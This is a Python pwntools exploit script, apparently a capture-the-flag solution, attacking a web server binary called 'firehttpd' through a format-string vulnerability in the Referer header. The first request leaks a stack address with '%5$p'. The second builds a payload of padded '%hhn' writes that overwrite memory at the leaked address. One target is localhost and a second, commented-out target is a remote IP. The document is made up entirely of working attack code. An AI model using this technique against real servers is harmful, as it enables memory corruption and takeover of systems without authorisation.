#!/usr/bin/env python3

import re
import sys
import random
from pwn import *

elf = ELF("./firehttpd")
context.log_level = 'debug'

# leak stack address to write
r = remote("127.0.0.1", 1337)
# r = remote("142.93.113.55", 31084)

payload = "%5$p"
request = (
    "GET / HTTP/1.0\r\n"
    "Referer: " + payload + "\r\n" +
    "\r\n"
)
r.send(request)
data = r.recvall()

leak = int(re.search(b"Referer: (0x[0-9a-f]+)\n", data).group(1), 16)

print("Leak: %x" % leak)

# write to address
r = remote("127.0.0.1", 1337)
# r = remote("142.93.113.55", 31084)

payload = (
    b"A" * 7 +
    b"%82x" + b"B" * 4 +
    b"%23$hhn" + b"B" * 1 +
    b"%258x" + b"B" * 3 +
    b"%24$hhn" + b"B" * 1 +
    b"%241x" + b"B" * 3 +
    b"%25$hhn" + b"B" * 1 +
    b"%258x" + b"B" * 3 +
    b"%26$hhn" + b"B" * 1 +
    b"%149x" + b"B" * 3 +
    b"%27$hhn" + b"B" * 1 +
    p64(leak) + 
    p64(leak + 1) +
    p64(leak + 2) +
    p64(leak + 3) +
    p64(leak + 4)
)

request = (
    b"GET / HTTP/1.0\r\n"
    b"Referer: " + payload + b"\r\n" +
    b"\r\n"
)
r.send(request)
print(r.recvall())

# r.interactive()
